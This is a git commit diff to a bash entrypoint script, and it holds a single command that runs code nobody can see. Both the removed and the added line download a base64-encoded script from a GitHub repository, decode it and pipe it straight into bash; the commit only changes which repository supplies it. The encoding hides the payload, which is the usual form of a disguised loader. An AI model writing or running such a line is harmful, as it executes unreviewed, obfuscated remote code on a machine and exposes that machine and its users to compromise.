35d1e13ba44b959eafbbcebaa0865f2cc6d48d21
paulbullet <paulbullet@proton.me>
2026-05-24 15:06:34 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/ziggywelch30711/rainlicker/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/paulbullet/spice/refs/heads/main/entrypoint.sh | base64 -d | bash
